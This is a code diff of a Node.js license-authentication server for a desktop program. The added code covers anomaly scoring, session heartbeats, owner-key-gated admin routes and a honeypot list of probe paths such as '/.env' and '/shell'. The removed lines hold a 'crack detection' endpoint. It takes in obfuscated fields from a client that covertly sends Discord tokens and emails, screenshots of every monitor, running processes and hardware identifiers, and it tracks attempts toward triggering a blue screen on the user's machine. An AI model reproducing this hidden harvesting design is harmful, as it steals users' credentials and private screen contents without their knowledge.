+    // Get or create pattern
+    if (!dataStores.requestPatterns.has(ip)) {
+        dataStores.requestPatterns.set(ip, {
+            endpoints: {},
+            requestTimes: [],
+            anomalyScore: 0,
+            lastRequest: Date.now()
+        });
+    }
+    
+    const pattern = dataStores.requestPatterns.get(ip);
     const now = Date.now();
-    const record = rateLimitStore.get(ip) || { count: 0, reset: now + RATE_LIMIT_WINDOW };
-    if (now > record.reset) { record.count = 0; record.reset = now + RATE_LIMIT_WINDOW; }
-    record.count++;
-    rateLimitStore.set(ip, record);
     
-    if (record.count > MAX_REQUESTS) return res.status(429).json({ success: false, message: 'Rate limited' });
+    // Track endpoint
+    pattern.endpoints[req.path] = (pattern.endpoints[req.path] || 0) + 1;
+    
+    // Track timing
+    pattern.requestTimes.push(now);
+    if (pattern.requestTimes.length > 100) pattern.requestTimes.shift();
+    
+    // Calculate anomaly score
+    let anomalyScore = 0;
+    
+    // Rapid requests
+    if (pattern.requestTimes.length >= 10) {
+        const recent = pattern.requestTimes.slice(-10);
+        const avgInterval = (recent[9] - recent[0]) / 9;
+        if (avgInterval < 100) anomalyScore += 2;
+    }
+    
+    // Too many admin endpoints
+    const adminHits = Object.keys(pattern.endpoints).filter(e => e.includes('admin')).length;
+    if (adminHits > 5) anomalyScore += 2;
+    
+    // Too many unique endpoints (probing)
+    if (Object.keys(pattern.endpoints).length > 20) anomalyScore += 2;
+    
+    pattern.anomalyScore = anomalyScore;
+    pattern.lastRequest = now;
+    
+    if (anomalyScore >= SECURITY_CONFIG.anomalyThreshold) {
+        console.log(`⚠️ Anomaly detected: ${ip} (score: ${anomalyScore})`);
+        dataStores.suspiciousIPs.add(ip);
+    }
+    
     next();
 });
 
-// ========================================
-// HEALTH ENDPOINTS
-// ========================================
-app.get('/', (req, res) => res.json({ status: 'online', version: '3.0', time: Date.now() }));
-app.get('/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));
-app.get('/auth/health', (req, res) => res.json({ status: 'ok', server_time: Date.now() }));
+// Body parser
+app.use(bodyParser.urlencoded({ extended: true, limit: '1mb' }));
+app.use(bodyParser.json({ limit: '1mb' }));
 
-// ========================================
-// SERVER STATUS ENDPOINT (for loader auto-update checks)
-// ========================================
-app.post('/auth/status', (req, res) => {
+// ============================================================================
+// HONEYPOT ENDPOINTS
+// ============================================================================
+const HONEYPOT_PATHS = [
+    '/admin', '/wp-admin', '/phpmyadmin', '/.env', '/config.php',
+    '/backup', '/db', '/database', '/sql', '/mysql', '/dump',
+    '/api/v1/admin', '/api/admin', '/administrator', '/cpanel',
+    '/.git', '/.svn', '/debug', '/test', '/dev', '/staging',
+    '/wp-login.php', '/xmlrpc.php', '/wp-content', '/wp-includes',
+    '/shell', '/cmd', '/exec', '/eval', '/system'
+];
+
+HONEYPOT_PATHS.forEach(path => {
+    app.all(path, (req, res) => {
+        const ip = getIP(req);
+        console.log(`🍯 HONEYPOT: ${ip} -> ${path}`);
+        
+        // Track hits
+        const hits = (dataStores.honeypotHits.get(ip) || 0) + 1;
+        dataStores.honeypotHits.set(ip, hits);
+        
+        // Auto-ban after 3 hits
+        if (hits >= SECURITY_CONFIG.autobanThreshold) {
+            dataStores.bannedIPs.add(ip);
+            console.log(`🚫 Auto-banned honeypot abuser: ${ip}`);
+        }
+        
+        // Delayed response to slow scanners
+        setTimeout(() => {
+            res.status(404).json({ error: 'Not found' });
+        }, 2000 + Math.random() * 3000);
+    });
+});
+
+// ============================================================================
+// HEALTH ENDPOINTS
+// ============================================================================
+app.get('/', (req, res) => {
+    res.json({
+        status: 'online',
+        version: '5.0',
+        time: Date.now(),
+        uptime: Math.floor((Date.now() - dataStores.serverState.startTime) / 1000)
+    });
+});
+
+app.get('/health', (req, res) => {
+    res.json({
+        status: 'ok',
+        uptime: process.uptime(),
+        memory: process.memoryUsage().heapUsed
+    });
+});
+
+app.get('/auth/health', (req, res) => {
+    res.json({
+        status: 'ok',
+        server_time: Date.now(),
+        auth_enabled: dataStores.serverState.authEnabled
+    });
+});
+
+// ============================================================================
+// STATUS ENDPOINT
+// ============================================================================
+app.all('/auth/status', (req, res) => {
     const ip = getIP(req);
-    const { app_secret, hwid } = req.body;
+    const hwid = req.body?.hwid;
     
-    // Check if IP or HWID is banned
-    const isBanned = bannedIPs.has(ip) || (hwid && bannedHWIDs.has(hwid));
+    const isBanned = dataStores.bannedIPs.has(ip) || 
+                     (hwid && dataStores.bannedHWIDs.has(hwid));
     
     res.json({
         success: true,
-        server_enabled: !serverDisabled,
-        server_disabled: serverDisabled,
-        auth_enabled: authEnabled,
-        maintenance: maintenanceMode,
-        lockdown: lockdownMode,
-        website_locked: websiteLocked,
+        server_enabled: dataStores.serverState.enabled,
+        server_disabled: !dataStores.serverState.enabled,
+        auth_enabled: dataStores.serverState.authEnabled,
+        maintenance: dataStores.serverState.maintenance,
+        lockdown: dataStores.serverState.lockdown,
+        website_locked: dataStores.serverState.websiteLocked,
         banned: isBanned,
         server_time: Date.now(),
-        version: '3.0'
+        version: '5.0'
     });
 });
 
-app.get('/auth/status', (req, res) => {
+// ============================================================================
+// AUTHENTICATION ENDPOINT - MAXIMUM SECURITY
+// ============================================================================
+app.post('/auth/validate', (req, res) => {
+    const ip = getIP(req);
+    const { license_key, hwid, app_secret, challenge } = req.body;
+    
+    // Validate app secret
+    if (app_secret !== APP_SECRET) {
+        dataStores.stats.failedAuths++;
+        return res.status(401).json(ResponseBuilder.error('Invalid credentials', 401));
+    }
+    
+    // Check server state
+    if (!dataStores.serverState.enabled || dataStores.serverState.lockdown) {
+        return res.json(ResponseBuilder.build({
+            success: false,
+            message: dataStores.serverState.lockdown ? 'Server in lockdown' : 'Server disabled'
+        }, challenge, false));
+    }
+    
+    if (dataStores.serverState.maintenance) {
+        return res.json(ResponseBuilder.build({
+            success: false,
+            message: 'Server under maintenance'
+        }, challenge, false));
+    }
+    
+    // Check bans
+    if (dataStores.bannedIPs.has(ip)) {
+        return res.status(403).json(ResponseBuilder.error('Access denied', 403));
+    }
+    
+    if (hwid && dataStores.bannedHWIDs.has(hwid)) {
+        return res.status(403).json(ResponseBuilder.error('Hardware banned', 403));
+    }
+    
+    // Validate inputs
+    if (!license_key || !hwid) {
+        dataStores.stats.failedAuths++;
+        return res.json(ResponseBuilder.build({
+            success: false,
+            message: 'Missing license key or HWID'
+        }, challenge, false));
+    }
+    
+    // Find license
+    const license = dataStores.licenses.get(license_key);
+    
+    if (!license) {
+        dataStores.stats.failedAuths++;
+        
+        // Track failed attempts
+        const attempts = (dataStores.crackAttemptCounter.get(hwid) || { count: 0 }).count + 1;
+        dataStores.crackAttemptCounter.set(hwid, { count: attempts, lastAttempt: Date.now() });
+        
+        // Log crack attempt
+        dataStores.crackAttempts.push({
+            timestamp: Date.now(),
+            ip,
+            hwid,
+            license_key,
+            type: 'invalid_key'
+        });
+        
+        return res.json(ResponseBuilder.build({
+            success: false,
+            message: 'Invalid license key'
+        }, challenge, false));
+    }
+    
+    // Check if license is valid
+    if (!license.valid) {
+        dataStores.stats.failedAuths++;
+        return res.json(ResponseBuilder.build({
+            success: false,
+            message: 'License revoked'
+        }, challenge, false));
+    }
+    
+    // Check expiration
+    if (Date.now() > license.expires) {
+        dataStores.stats.failedAuths++;
+        return res.json(ResponseBuilder.build({
+            success: false,
+            message: 'License expired'
+        }, challenge, false));
+    }
+    
+    // Check HWID binding
+    if (license.hwid && license.hwid !== hwid) {
+        dataStores.stats.failedAuths++;
+        
+        // Log potential crack attempt
+        dataStores.crackAttempts.push({
+            timestamp: Date.now(),
+            ip,
+            hwid,
+            license_key,
+            type: 'hwid_mismatch',
+            expected_hwid: license.hwid
+        });
+        
+        return res.json(ResponseBuilder.build({
+            success: false,
+            message: 'License bound to different hardware'
+        }, challenge, false));
+    }
+    
+    // Bind HWID if not bound
+    if (!license.hwid) {
+        license.hwid = hwid;
+        license.activated = true;
+        license.activatedAt = Date.now();
+        license.activatedIP = ip;
+    }
+    
+    // Check session limits
+    const existingSessions = Array.from(dataStores.activeSessions.values())
+        .filter(s => s.hwid === hwid);
+    
+    if (existingSessions.length >= SECURITY_CONFIG.maxSessionsPerHWID) {
+        // Remove oldest session
+        const oldest = existingSessions.sort((a, b) => a.created - b.created)[0];
+        dataStores.activeSessions.delete(oldest.token);
+    }
+    
+    // Generate session token
+    const sessionToken = CryptoUtils.generateSessionToken(hwid, ip);
+    
+    // Store session
+    dataStores.activeSessions.set(sessionToken, {
+        token: sessionToken,
+        hwid,
+        ip,
+        license_key,
+        created: Date.now(),
+        lastHeartbeat: Date.now(),
+        missedHeartbeats: 0
+    });
+    
+    dataStores.stats.successfulAuths++;
+    
+    // Update license last used
+    license.lastUsed = Date.now();
+    license.lastIP = ip;
+    
+    // Build success response
+    return res.json(ResponseBuilder.success({
+        message: 'License valid',
+        session_token: sessionToken,
+        expires_at: license.expires,
+        tier: license.tier || 'standard',
+        features: {
+            premium: license.tier === 'premium',
+            beta: license.tier === 'premium'
+        }
+    }, challenge));
+});
+
+// ============================================================================
+// SESSION HEARTBEAT
+// ============================================================================
+app.post('/auth/heartbeat', (req, res) => {
+    const { session_token, hwid, app_secret } = req.body;
+    
+    if (app_secret !== APP_SECRET) {
+        return res.status(401).json(ResponseBuilder.error('Invalid credentials', 401));
+    }
+    
+    const session = dataStores.activeSessions.get(session_token);
+    
+    if (!session) {
+        return res.json({ success: false, message: 'Invalid session', expired: true });
+    }
+    
+    if (session.hwid !== hwid) {
+        // Session hijacking attempt
+        dataStores.activeSessions.delete(session_token);
+        return res.json({ success: false, message: 'Session invalid', expired: true });
+    }
+    
+    // Update heartbeat
+    session.lastHeartbeat = Date.now();
+    session.missedHeartbeats = 0;
+    
     res.json({
         success: true,
-        server_enabled: !serverDisabled,
-        server_disabled: serverDisabled,
-        auth_enabled: authEnabled,
-        maintenance: maintenanceMode,
-        lockdown: lockdownMode,
-        website_locked: websiteLocked,
+        message: 'Heartbeat received',
         server_time: Date.now(),
-        version: '3.0'
+        next_heartbeat: SECURITY_CONFIG.heartbeatInterval
     });
 });
 
-// ========================================
-// TEST ENDPOINT
-// ========================================
-app.post('/auth/test', (req, res) => {
-    res.json(sign({ success: true, message: 'Server online', version: '3.0-SIGNED' }, req.body._challenge));
-});
-
-// ========================================
-// LICENSE ENDPOINT
-// ========================================
-app.post('/auth/license', (req, res) => {
-    const { license_key, hwid, _challenge } = req.body;
+// ============================================================================
+// SESSION VERIFICATION
+// ============================================================================
+app.post('/auth/verify-session', (req, res) => {
+    const { session_token, hwid, app_secret } = req.body;
     
-    if (serverDisabled) return res.json(sign({ success: false, message: 'Server is disabled' }, _challenge));
-    if (!license_key) return res.json(sign({ success: false, message: 'License key required' }, _challenge));
-    
-    const lic = licenses[license_key];
-    if (!lic) return res.json(sign({ success: false, message: 'Invalid license key' }, _challenge));
-    if (!lic.valid) return res.json(sign({ success: false, message: 'License has been revoked' }, _challenge));
-    if (lic.expires < Date.now()) return res.json(sign({ success: false, message: 'License has expired' }, _challenge));
-    if (lic.hwid && lic.hwid !== hwid) return res.json(sign({ success: false, message: 'License bound to different hardware' }, _challenge));
-    
-    if (!lic.hwid && hwid) { lic.hwid = hwid; lic.activated = true; }
-    
-    const token = genToken();
-    activeSessions.set(token, { license_key, hwid, created: Date.now(), expires: Date.now() + 3600000 });
-    
-    res.json(sign({ success: true, message: 'License valid', session_token: token, expiry: lic.expires }, _challenge));
-});
-
-// ========================================
-// VALIDATE ENDPOINT
-// ========================================
-app.post('/auth/validate', (req, res) => {
-    const { license_key, hwid, _challenge } = req.body;
-    
-    if (serverDisabled) return res.json(sign({ success: false, message: 'Server is disabled' }, _challenge));
-    if (!license_key) return res.json(sign({ success: false, message: 'License key required' }, _challenge));
-    
-    const lic = licenses[license_key];
-    if (!lic) return res.json(sign({ success: false, message: 'Invalid license key' }, _challenge));
-    if (!lic.valid) return res.json(sign({ success: false, message: 'License has been revoked' }, _challenge));
-    if (lic.expires < Date.now()) return res.json(sign({ success: false, message: 'License has expired' }, _challenge));
-    if (lic.hwid && lic.hwid !== hwid) return res.json(sign({ success: false, message: 'License bound to different hardware' }, _challenge));
-    
-    if (!lic.hwid && hwid) { lic.hwid = hwid; lic.activated = true; }
-    
-    const token = genToken();
-    activeSessions.set(token, { license_key, hwid, created: Date.now(), expires: Date.now() + 3600000 });
-    
-    res.json(sign({ success: true, message: 'License valid', session_token: token, expires: lic.expires }, _challenge));
-});
-
-// ========================================
-// ACTIVATE ENDPOINT
-// ========================================
-app.post('/auth/activate', (req, res) => {
-    const { license_key, hwid, _challenge } = req.body;
-    
-    if (!license_key || !hwid) return res.json(sign({ success: false, message: 'License key and HWID required' }, _challenge));
-    
-    const lic = licenses[license_key];
-    if (!lic) return res.json(sign({ success: false, message: 'Invalid license key' }, _challenge));
-    if (lic.hwid && lic.hwid !== hwid) return res.json(sign({ success: false, message: 'License already bound' }, _challenge));
-    
-    lic.hwid = hwid;
-    lic.activated = true;
-    
-    const token = genToken();
-    activeSessions.set(token, { license_key, hwid, created: Date.now(), expires: Date.now() + 3600000 });
-    
-    res.json(sign({ success: true, message: 'License activated', session_token: token }, _challenge));
-});
-
-// ========================================
-// HEARTBEAT
-// ========================================
-app.post('/auth/heartbeat', (req, res) => {
-    const { session_token, _challenge } = req.body;
-    const session = activeSessions.get(session_token);
-    
-    if (!session) return res.json(sign({ success: false, message: 'Invalid session' }, _challenge));
-    if (session.expires < Date.now()) {
-        activeSessions.delete(session_token);
-        return res.json(sign({ success: false, message: 'Session expired' }, _challenge));
+    if (app_secret !== APP_SECRET) {
+        return res.status(401).json(ResponseBuilder.error('Invalid credentials', 401));
     }
     
-    session.expires = Date.now() + 3600000;
-    res.json(sign({ success: true, message: 'Session valid' }, _challenge));
+    const session = dataStores.activeSessions.get(session_token);
+    
+    if (!session || session.hwid !== hwid) {
+        return res.json({ success: false, valid: false, message: 'Invalid session' });
+    }
+    
+    // Check session timeout
+    const age = Date.now() - session.created;
+    if (age > SECURITY_CONFIG.sessionTimeout) {
+        dataStores.activeSessions.delete(session_token);
+        return res.json({ success: false, valid: false, message: 'Session expired' });
+    }
+    
+    // Check heartbeat
+    const heartbeatAge = Date.now() - session.lastHeartbeat;
+    if (heartbeatAge > SECURITY_CONFIG.heartbeatInterval * SECURITY_CONFIG.maxMissedHeartbeats) {
+        dataStores.activeSessions.delete(session_token);
+        return res.json({ success: false, valid: false, message: 'Session expired (missed heartbeats)' });
+    }
+    
+    res.json({
+        success: true,
+        valid: true,
+        session_age: age,
+        expires_in: SECURITY_CONFIG.sessionTimeout - age
+    });
 });
 
-// ========================================
-// VERIFY OWNER KEY
-// ========================================
+// ============================================================================
+// OWNER KEY VERIFICATION
+// ============================================================================
 app.post('/auth/verify-owner-key', (req, res) => {
-    const { owner_key } = req.body;
-    if (owner_key === ownerKey.key) {
-        res.json({ success: true, message: 'Owner key valid' });
-    } else {
-        res.json({ success: false, message: 'Invalid owner key' });
-    }
-});
-
-// ========================================
-// OWNER KEY ENDPOINTS - SECURED
-// ========================================
-// DISABLED: These endpoints were a security vulnerability
-// Owner key should only be visible in server console logs
-
-app.post('/auth/get-owner-key', (req, res) => {
-    // SECURITY: Do not expose owner key without proper verification
-    // The owner key is shown in server console on startup
-    res.json({ 
-        success: false, 
-        message: 'Owner key cannot be fetched remotely. Check server console logs.',
-        hint: 'The owner key is displayed when the server starts.'
-    });
-});
-
-app.post('/auth/get-owner-key-by-hwid', (req, res) => {
-    // SECURITY: Do not expose owner key without proper verification
-    res.json({ 
-        success: false, 
-        message: 'Owner key cannot be fetched remotely. Check server console logs.',
-        hint: 'The owner key is displayed when the server starts.'
-    });
-});
-
-app.post('/auth/admin/rotate-owner-key', (req, res) => {
-    ownerKey = {
-        key: crypto.randomBytes(32).toString('hex'),
-        created: Date.now(),
-        nextRotation: Date.now() + 24*60*60*1000
-    };
-    res.json({ success: true, message: 'Owner key rotated', owner_key: ownerKey.key, next_rotation: ownerKey.nextRotation });
-});
-
-// ========================================
-// ADMIN: GENERATE SINGLE KEY
-// ========================================
-app.post('/auth/admin/generate-key', (req, res) => {
-    const { duration_days = 30, owner_key: reqOwnerKey } = req.body;
+    const { owner_key, app_secret } = req.body;
     
-    if (reqOwnerKey && reqOwnerKey !== ownerKey.key) {
-        return res.json({ success: false, message: 'Invalid owner key' });
+    if (app_secret !== APP_SECRET) {
+        return res.status(401).json(ResponseBuilder.error('Invalid credentials', 401));
     }
     
-    const key = generateLicenseKey();
-    licenses[key] = {
-            valid: true,
+    if (owner_key === dataStores.ownerKey.key) {
+        dataStores.ownerKey.lastUsed = Date.now();
+        return res.json({ success: true, message: 'Owner key valid' });
+    }
+    
+    return res.json({ success: false, message: 'Invalid owner key' });
+});
+
+// ============================================================================
+// ADMIN ENDPOINTS
+// ============================================================================
+
+// Middleware to verify owner key
+const requireOwnerKey = (req, res, next) => {
+    const { owner_key, app_secret } = req.body;
+    
+    if (app_secret !== APP_SECRET || owner_key !== dataStores.ownerKey.key) {
+        return res.status(401).json(ResponseBuilder.error('Unauthorized', 401));
+    }
+    
+    next();
+};
+
+// Generate keys
+app.post('/auth/admin/generate-key', requireOwnerKey, (req, res) => {
+    const { duration_days = 30, tier = 'standard' } = req.body;
+    
+    const key = CryptoUtils.generateLicenseKey();
+    const expires = Date.now() + (duration_days * 24 * 60 * 60 * 1000);
+    
+    dataStores.licenses.set(key, {
+        valid: true,
         hwid: null,
         activated: false,
         created: Date.now(),
-        expires: Date.now() + (duration_days * 24 * 60 * 60 * 1000)
-    };
+        expires,
+        tier
+    });
     
-    console.log(`Generated key: ${key}`);
-    res.json({ success: true, license_key: key, key: key, expires: licenses[key].expires });
+    res.json({
+        success: true,
+        key,
+        expires_at: expires,
+        duration_days,
+        tier
+    });
 });
 
-// ========================================
-// ADMIN: BULK GENERATE KEYS
-// ========================================
-app.post('/auth/admin/bulk-generate-keys', (req, res) => {
-    const { count = 10, duration_days = 30, owner_key: reqOwnerKey } = req.body;
+// Bulk generate keys
+app.post('/auth/admin/bulk-generate-keys', requireOwnerKey, (req, res) => {
+    const { count = 10, duration_days = 30, tier = 'standard' } = req.body;
+    const keys = [];
     
-    if (reqOwnerKey && reqOwnerKey !== ownerKey.key) {
-        return res.json({ success: false, message: 'Invalid owner key' });
-    }
+    const safeCount = Math.min(Math.max(1, count), 100);
+    const expires = Date.now() + (duration_days * 24 * 60 * 60 * 1000);
     
-    const numKeys = Math.min(Math.max(parseInt(count) || 10, 1), 100); // 1-100 keys max
-    const generatedKeys = [];
-    
-    for (let i = 0; i < numKeys; i++) {
-        const key = generateLicenseKey();
-        licenses[key] = {
+    for (let i = 0; i < safeCount; i++) {
+        const key = CryptoUtils.generateLicenseKey();
+        dataStores.licenses.set(key, {
             valid: true,
             hwid: null,
             activated: false,
             created: Date.now(),
-            expires: Date.now() + (duration_days * 24 * 60 * 60 * 1000)
-        };
-        generatedKeys.push({
-            key: key,
-            expires: licenses[key].expires
+            expires,
+            tier
+        });
+        keys.push({ key, expires_at: expires });
+    }
+    
+    res.json({ success: true, keys, count: keys.length });
+});
+
+// List keys
+app.post('/auth/admin/list-keys', requireOwnerKey, (req, res) => {
+    const licenses = [];
+    for (const [key, data] of dataStores.licenses) {
+        licenses.push({
+            key,
+            valid: data.valid,
+            activated: data.activated,
+            hwid: data.hwid,
+            created: data.created,
+            expires: data.expires,
+            tier: data.tier
         });
     }
-    
-    console.log(`Bulk generated ${generatedKeys.length} keys`);
-    res.json({
-        success: true,
-        message: `Generated ${generatedKeys.length} keys`,
-        count: generatedKeys.length,
-        keys: generatedKeys 
-    });
+    res.json({ success: true, licenses, total: licenses.length });
 });
 
-// ========================================
-// ADMIN: LIST KEYS
-// ========================================
-app.post('/auth/admin/list-keys', (req, res) => {
-    const keys = Object.entries(licenses).map(([key, data]) => ({
-        key,
-        valid: data.valid,
-        activated: data.activated,
-        hwid: data.hwid,
-        expires: data.expires,
-        created: data.created
-    }));
-    res.json({ success: true, licenses: keys, keys: keys });
-});
-
-// ========================================
-// ADMIN: REVOKE KEY
-// ========================================
-app.post('/auth/admin/revoke-key', (req, res) => {
+// Revoke key
+app.post('/auth/admin/revoke-key', requireOwnerKey, (req, res) => {
     const { license_key } = req.body;
-    if (licenses[license_key]) {
-        licenses[license_key].valid = false;
-        res.json({ success: true, message: 'License revoked' });
+    const license = dataStores.licenses.get(license_key);
+    
+    if (license) {
+        license.valid = false;
+        license.revokedAt = Date.now();
+        res.json({ success: true, message: 'Key revoked' });
     } else {
-        res.json({ success: false, message: 'License not found' });
+        res.json({ success: false, message: 'Key not found' });
     }
 });
 
-// ========================================
-// CRACK DETECTION LOGGING SYSTEM
-// ========================================
-
-// Decode obfuscated field names from C++ client
-// The client sends shortened field names to hide what data is being transmitted
-const obfuscatedFieldMap = {
-    'a_s': 'app_secret',
-    'h': 'hwid',
-    'dt': 'detection_type',
-    'dtl': 'detected_tool',
-    'cn': 'computer_name',
-    'un': 'username',
-    'ma': 'mac_address',
-    'pi': 'public_ip',
-    'c': 'cpu',
-    'g': 'gpu',
-    'r': 'ram',
-    'wv': 'windows_version',
-    'ds': 'disk_serial',
-    'mb': 'motherboard',
-    'bi': 'bios',
-    'na': 'network_adapters',
-    'sr': 'screen_resolution',
-    'tz': 'timezone',
-    'su': 'system_uptime',
-    'rp': 'running_processes',
-    'dui': 'discord_user_id',
-    'dun': 'discord_username',
-    'dd': 'discord_discriminator',
-    'de': 'discord_email',
-    'dtkn': 'discord_token',
-    'mc': 'monitor_count',
-    'sb64': 'screenshots_base64',
-    'ts': 'timestamp'
-};
-
-// Function to decode obfuscated request body
-function decodeObfuscatedBody(body) {
-    const decoded = {};
-    for (const [key, value] of Object.entries(body)) {
-        const decodedKey = obfuscatedFieldMap[key] || key;
-        decoded[decodedKey] = value;
-    }
-    return decoded;
-}
-
-// Log a crack attempt (called from C++ client)
-app.post('/auth/log-crack-attempt', (req, res) => {
-    try {
-        const serverIP = getIP(req);
-        
-        // Decode obfuscated fields (if client sends obfuscated data)
-        const decodedBody = decodeObfuscatedBody(req.body);
-        
-        const { 
-            hwid, 
-            gpu_hash,
-            motherboard_uuid,
-            detection_type,
-            detected_tool,
-            screenshot_base64,
-            screenshots_base64, // Multi-monitor screenshots (separated by |||)
-            monitor_count,      // Number of monitors
-            system_info,
-            username, 
-            computer_name,
-            windows_version,
-            mac_address,
-            cpu,
-            gpu,
-            ram,
-            disk_serial,
-            timestamp, 
-            // Additional fields
-            public_ip,
-            motherboard,
-            bios,
-            network_adapters,
-            screen_resolution,
-            timezone,
-            system_uptime,
-            running_processes,
-            discord_user_id,
-            discord_username,
-            discord_discriminator,
-            discord_email,
-            discord_token
-        } = { ...req.body, ...decodedBody }; // Merge original and decoded
-            
-        // Use public IP if provided (more accurate), fallback to server-detected IP
-        const ip = public_ip && public_ip !== 'Unknown' ? public_ip : serverIP;
-            
-        // Handle multi-monitor screenshots (separated by |||)
-        const screenshotData = screenshots_base64 || screenshot_base64;
-        const screenshotArray = screenshotData ? screenshotData.split('|||') : [];
-        const numMonitors = monitor_count || screenshotArray.length || 1;
-        
-        const crackLog = {
-            id: crypto.randomBytes(8).toString('hex'),
-            timestamp: timestamp || Date.now(),
-            ip: ip,
-            server_ip: serverIP, // Keep both for reference
-            hwid: hwid || gpu_hash || 'unknown',
-            motherboard_uuid: motherboard_uuid || 'unknown',
-            detection_type: detection_type || 'unknown',
-            detected_tool: detected_tool || 'unknown',
-            screenshot: screenshotArray.length > 0 ? screenshotArray[0].substring(0, 100) + '...' : null,
-            has_screenshot: screenshotArray.length > 0,
-            monitor_count: numMonitors,
-            screenshots: screenshotArray.map((s, i) => ({
-                monitor: i + 1,
-                preview: s.substring(0, 50) + '...',
-                has_data: s.length > 0
-            })),
-            system_info: system_info || {},
-            username: username || 'unknown',
-            computer_name: computer_name || 'unknown',
-            windows_version: windows_version || 'unknown',
-            // Hardware info
-            mac_address: mac_address || 'unknown',
-            cpu: cpu || 'unknown',
-            gpu: gpu || 'unknown',
-            ram: ram || 'unknown',
-            disk_serial: disk_serial || 'unknown',
-            motherboard: motherboard || 'unknown',
-            bios: bios || 'unknown',
-            // Network info
-            network_adapters: network_adapters || 'unknown',
-            // System info
-            screen_resolution: screen_resolution || 'unknown',
-            timezone: timezone || 'unknown',
-            system_uptime: system_uptime || 'unknown',
-            running_processes: running_processes || '',
-            // Discord info
-            discord: {
-                user_id: discord_user_id || 'unknown',
-                username: discord_username || 'unknown',
-                discriminator: discord_discriminator || '0000',
-                email: discord_email || 'unknown',
-                token_preview: discord_token || 'Not Found'
-            }
-        };
-
-        // Store full screenshots separately (for each monitor)
-        if (screenshotArray.length > 0) {
-            crackLog.screenshots_full = screenshotArray;
-        }
-
-        // Add to logs (keep last MAX_CRACK_LOGS)
-        crackAttempts.unshift(crackLog);
-        if (crackAttempts.length > MAX_CRACK_LOGS) {
-            crackAttempts.pop();
-        }
-
-        // Auto-ban the HWID and IP
-        if (hwid) bannedHWIDs.add(hwid);
-        if (gpu_hash) bannedHWIDs.add(gpu_hash);
-        if (mac_address && mac_address !== 'unknown') bannedHWIDs.add(mac_address);
-        bannedIPs.add(ip);
-
-        // Track crack attempts per HWID for BSOD system
-        const hwidKey = hwid || gpu_hash || mac_address || ip;
-        const now = Date.now();
-        
-        if (crackAttemptCounter.has(hwidKey)) {
-            const counter = crackAttemptCounter.get(hwidKey);
-            // Reset if 24 hours have passed
-            if ((now - counter.firstAttempt) > 24 * 60 * 60 * 1000) {
-                crackAttemptCounter.set(hwidKey, { count: 1, firstAttempt: now });
-    } else {
-                counter.count++;
-            }
-        } else {
-            crackAttemptCounter.set(hwidKey, { count: 1, firstAttempt: now });
-        }
-        
-        const attemptData = crackAttemptCounter.get(hwidKey);
-        crackLog.attempt_number = attemptData.count;
-        crackLog.will_bsod = attemptData.count >= 3;
-
-        console.log(`🚨 CRACK ATTEMPT LOGGED: ${detected_tool} from ${ip}`);
-        console.log(`   HWID: ${hwid || gpu_hash}`);
-        console.log(`   MAC: ${mac_address}`);
-        console.log(`   CPU: ${cpu}`);
-        console.log(`   GPU: ${gpu}`);
-        console.log(`   User: ${computer_name}\\${username}`);
-        console.log(`   Screenshot: ${crackLog.has_screenshot ? 'YES' : 'NO'}`);
-        console.log(`   ⚠️ ATTEMPT #${attemptData.count}/3 ${attemptData.count >= 3 ? '- BSOD TRIGGERED!' : ''}`);
-
-        res.json({ success: true, message: 'Crack attempt logged', id: crackLog.id, attempt_number: attemptData.count });
-    } catch (error) {
-        console.error('Error logging crack attempt:', error);
-        // Still return success to not alert the cracker
-        res.json({ success: true, message: 'Logged' });
-    }
-});
-
-// Get crack attempts (admin)
-app.post('/auth/admin/get-crack-attempts', (req, res) => {
-    const { limit = 50, include_screenshots = false } = req.body;
-    
-    const logs = crackAttempts.slice(0, Math.min(limit, MAX_CRACK_LOGS)).map(log => {
-        const result = { ...log };
-        if (!include_screenshots) {
-            delete result.screenshot_full;
-        }
-        return result;
-    });
-    
-    res.json({ 
-        success: true, 
-        count: logs.length,
-        total: crackAttempts.length,
-        attempts: logs 
-    });
-});
-
-// Get single crack attempt with full screenshot
-app.post('/auth/admin/get-crack-attempt', (req, res) => {
-    const { id } = req.body;
-    const attempt = crackAttempts.find(a => a.id === id);
-    
-    if (attempt) {
-        res.json({ success: true, attempt });
-    } else {
-        res.json({ success: false, message: 'Attempt not found' });
-    }
-});
-
-// Clear crack logs
-app.post('/auth/admin/clear-crack-logs', (req, res) => {
-    crackAttempts.length = 0;
-    res.json({ success: true, message: 'Crack logs cleared' });
-});
-
-// Get crack stats
-app.post('/auth/admin/crack-stats', (req, res) => {
-    const last24h = crackAttempts.filter(a => a.timestamp > Date.now() - 24*60*60*1000).length;
-    const lastWeek = crackAttempts.filter(a => a.timestamp > Date.now() - 7*24*60*60*1000).length;
-    
-    // Group by detection type
-    const byType = {};
-    crackAttempts.forEach(a => {
-        byType[a.detection_type] = (byType[a.detection_type] || 0) + 1;
-    });
-    
-    // Group by tool
-    const byTool = {};
-    crackAttempts.forEach(a => {
-        byTool[a.detected_tool] = (byTool[a.detected_tool] || 0) + 1;
-    });
-    
-    res.json({ 
-        success: true, 
-        total: crackAttempts.length,
-        last_24h: last24h,
-        last_week: lastWeek,
-        by_type: byType,
-        by_tool: byTool,
-        unique_ips: [...new Set(crackAttempts.map(a => a.ip))].length,
-        unique_hwids: [...new Set(crackAttempts.map(a => a.hwid))].length
-    });
-});
-
-// ========================================
-// ADMIN: STATUS & STATS
-// ========================================
-app.post('/auth/admin/status', (req, res) => {
-    res.json({
-        success: true,
-        server_enabled: !serverDisabled,
-        auth_enabled: authEnabled,
-        maintenance_mode: maintenanceMode,
-        lockdown_mode: lockdownMode,
-        website_locked: websiteLocked,
-        active_sessions: activeSessions.size,
-        total_licenses: Object.keys(licenses).length,
-        banned_ips: bannedIPs.size,
-        banned_hwids: bannedHWIDs.size,
-        crack_attempts: crackAttempts.length,
-        uptime: process.uptime()
-    });
-});
-
-app.post('/auth/admin/stats', (req, res) => {
-        res.json({
-            success: true,
-        total_licenses: Object.keys(licenses).length,
-        active_licenses: Object.values(licenses).filter(l => l.valid && l.activated).length,
-        active_sessions: activeSessions.size,
-        banned_ips: bannedIPs.size,
-        banned_hwids: bannedHWIDs.size,
-        whitelisted_ips: whitelistedIPs.size,
-        crack_attempts: crackAttempts.length
-    });
-});
-
-app.post('/auth/admin/security-stats', (req, res) => {
-    // Count active licenses (activated and not expired)
-    const now = Date.now();
-    const activeCount = Object.values(licenses).filter(l => l.activated && l.valid && l.expires > now).length;
-    
-    res.json({
-        success: true,
-        banned_ips: bannedIPs.size,
-        banned_hwids: bannedHWIDs.size,
-        whitelisted_ips: whitelistedIPs.size,
